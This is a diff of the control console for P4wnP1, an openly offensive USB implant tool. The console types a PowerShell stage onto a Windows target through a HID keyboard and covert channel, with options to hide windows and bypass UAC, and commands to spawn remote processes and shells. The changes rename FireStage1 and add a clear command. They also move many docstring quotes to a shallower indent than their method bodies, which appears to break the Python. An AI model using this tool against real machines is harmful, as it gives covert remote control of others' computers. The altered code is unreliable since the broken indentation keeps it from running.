@@ -110,8 +110,8 @@ Web: https://github.com/mame82/P4wnP1
 State: Experimental (maybe forever ;-))
 
 Enter "help" for help
-Enter "FireStage1" to run stage 1 against the current target.
-Use "help FireStage1" to get more details.
+Enter "FireStage" to run stage 1 against the current target.
+Use "help FireStage" to get more details.
 =================================
 '''
 		
@@ -126,7 +126,7 @@ Use "help FireStage1" to get more details.
 				print "--------------------------------------------------------------"
 				print ""
 				print "Use 'SetKeyboardLanguage' to switch to your targtes keyboard"
-				print "layout and run 'FireStage1' to connect via HID covert channel."
+				print "layout and run 'FireStage' to connect via HID covert channel."
 				print "--------------------------------------------------------------"
 				print ""
 				return ""		
@@ -396,7 +396,7 @@ Use "help FireStage1" to get more details.
 		self.sendControlMessage(P4wnP1.CTRL_MSG_FROM_SERVER_DESTROY)
 	
 	def stage1_trigger(self, trigger_type=1, trigger_delay_ms=1000,  hideTargetWindow = True,  bypassUAC = False):
-		'''
+	'''
 		Triggers Stage 1 either with pure PowerShell using reflections (trigger_type = 1)
 		or with PowerShell invoking a .NET assembly, running stage1 (trigger_type = 2)
 		
@@ -409,7 +409,7 @@ Use "help FireStage1" to get more details.
 		  Is slower, because around 6000 chars have to be printed to build the needed assembly. 
 		  There's no need to account on PID and VID, as the code is using the device serial "deadbeefdeadbeef"
 		  and the manufacturer "MaMe82".
-		'''
+	'''
 	
 		gadget_dir = "/sys/kernel/config/usb_gadget/mame82gadget/"
 		
@@ -431,7 +431,7 @@ Use "help FireStage1" to get more details.
 				SHIFT TAB
 				DELAY 100
 				ENTER
-		'''
+	'''
 			# use trigger delay once more
 			ps_stub += "DELAY " + str(trigger_delay_ms) + "\n"
 		
@@ -585,7 +585,7 @@ Use "help FireStage1" to get more details.
 
 
 	def do_KillProc(self, line):
-		'''
+	'''
 	Try to kill the given remote process
 	'''
 		try:
@@ -597,7 +597,7 @@ Use "help FireStage1" to get more details.
 
 
 	def do_KillClient(self, line):
-		'''
+	'''
 	Try to kill the remote client
 	'''
 
@@ -607,11 +607,18 @@ Use "help FireStage1" to get more details.
 		
 		self.killCLient()
 
+	def do_clear(self, line):
+	'''
+	Clears the terminal screen
+	'''
+		os.system('clear')
+
+
 	def do_CreateProc(self, line):
-		'''
+	'''
 		This remote Powershell method calls "core_create_proc" in order to create a remote process
 		The response is handled by "handler_client_core_create_proc()"
-		'''
+	'''
 
 		if not self.client.isConnected():
 			print "Not possible, client not connected"
@@ -626,9 +633,9 @@ Use "help FireStage1" to get more details.
 		self.client_call_create_proc(proc_name, proc_args, use_channels = True, waitForResult = False)
 
 	def do_GetClientProcs(self, line):
-		'''
+	'''
 		Print a list of processes managed by the remote client
-		'''
+	'''
 
 		if not self.client.isConnected():
 			print "Not possible, client not connected"
@@ -638,7 +645,7 @@ Use "help FireStage1" to get more details.
 
 	def do_shell(self, line):
 		if not self.client.isConnected():
-			print "Not possible... Run 'FireStage1' first, to get the target connected"
+			print "Not possible... Run 'FireStage' first, to get the target connected"
 			return
 		if "powershell" in line.lower():
 			self.client_call_create_shell_proc("powershell.exe")
@@ -656,16 +663,16 @@ Use "help FireStage1" to get more details.
 		#self.client.callMethod(method_name, method_args, self.handler_client_method_response)
 		
 	def do_SendKeys(self, line):
-		'''
+	'''
 	Prints out everything on target through HID keyboard. Be sure
 	to set the correct keyboard language for your target  (use 
 	'GetKeyboardLanguage' and 'SetKeyboardLanguage' commands.).
 	'''
 		self.duckencoder.outhidStringDirect(line)
 	
-	def do_FireStage1(self, line):
-		'''
-	usage: FireStage1 <trigger_type> <trigger_delay in milliseconds> [nohide] [uac]
+	def do_FireStage(self, line):
+	'''
+	Usage: FireStage <trigger_type> <trigger_delay in milliseconds> [nohide] [uac]
 	
 	Fires stage 1 via HID keyboard against a PowerShell process
 	on a Windows client.
@@ -748,7 +755,7 @@ Use "help FireStage1" to get more details.
 		print "keyboard layout with 'SetKeyboardLanguage'"
 		
 	def do_SetKeyboardLanguage(self, line):
-		'''
+	'''
 	Sets the language for target keyboard interaction.
 	Possible values: 
 	  be, br, ca, ch, de, dk, es, fi, fr, gb, hr, it,
@@ -823,7 +830,7 @@ Use "help FireStage1" to get more details.
 		
 		
 	def do_GetKeyboardLanguage(self, line):
-		'''
+	'''
 	Shows which language is set for HID keyboard.
 	'''
 		print self.duckencoder.getLanguage()
@@ -860,7 +867,7 @@ Use "help FireStage1" to get more details.
 	def do_state(self, line):
 		self.client.print_state()
 	def do_echotest(self, line):
-		'''
+	'''
 	If the client is connected, command arguments given should be reflected back.
 	Communications happen through a pure HID covert channel.
 	'''
